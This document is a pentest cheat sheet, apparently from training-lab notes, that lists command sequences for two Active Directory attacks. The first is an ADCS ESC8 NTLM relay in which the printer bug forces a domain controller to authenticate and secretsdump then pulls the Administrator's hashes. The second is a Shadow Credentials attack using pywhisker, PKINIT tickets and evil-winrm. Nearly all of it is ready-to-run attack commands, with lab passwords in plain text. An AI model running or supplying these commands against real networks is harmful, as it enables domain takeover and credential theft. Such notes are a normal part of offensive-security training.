# ADCS - ESC8 (NTLM relay attack)
#### List templates
```
certipy find -u ca_svc@sequel.htb -hashes <hash> -stdout -vulnerable
```
#### Listen for inbound connection and relay them
>You can either wait or force the victims to attempt authentication against their machine randomly.
```
impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template <templaate name(KerberoAuthentication)>
```
#### Force the machine to authenticate (exploiting the printer-bug)
>Doing this, we will have a `./DC01$.pfx` file (ntlmrelayx will write that file)
```
python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12
```
#### Obtain a TGT ticket as `DC01`
```
python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache
```
#### Login as DC01
```
export KRB5CCNAME=/tmp/dc.ccache;
impacket-secretsdump -user-status -history -pwd-last-set -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
```
---
# Shadow Credentials attack
It refers to AD attack that abuse the `msDC-KeyCredentialLink` attribute of a victim user.
#### Perform the attack
```
pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add
```
#### Obtain a TGT from pfx certificate
```
python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
```
#### Login as DC01
```
export KRB5CCNAME=/tmp/jpinkam.ccache
```
```
evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
```

In certain environments, an attacker may be able to obtain a certificate but be unable to use it for pre-authentication as specific victims due to the KDC not supporting the appropriate EKU. You can use this [PassTheCert](https://github.com/AlmondOffSec/PassTheCert/) tool.

